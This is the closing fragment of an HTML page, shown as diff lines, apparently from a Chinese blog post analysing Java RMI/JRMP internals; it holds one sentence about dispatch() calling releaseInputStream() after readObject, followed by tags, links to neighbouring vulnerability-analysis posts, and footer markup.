+<p>到这里 JRMP 的通信流程基本结束了，接着再回到 <code>dispatch()</code> 方法，在调用了 <code>readObject</code> 方法之后调用了 <code>var2.releaseInputStream();</code>，跟进</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/08/07/Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Servlet 型内存马">
+                  <i class="fa fa-angle-left"></i> Servlet 型内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/08/10/log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="log4j2漏洞分析">
+                  log4j2漏洞分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Hai0u</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
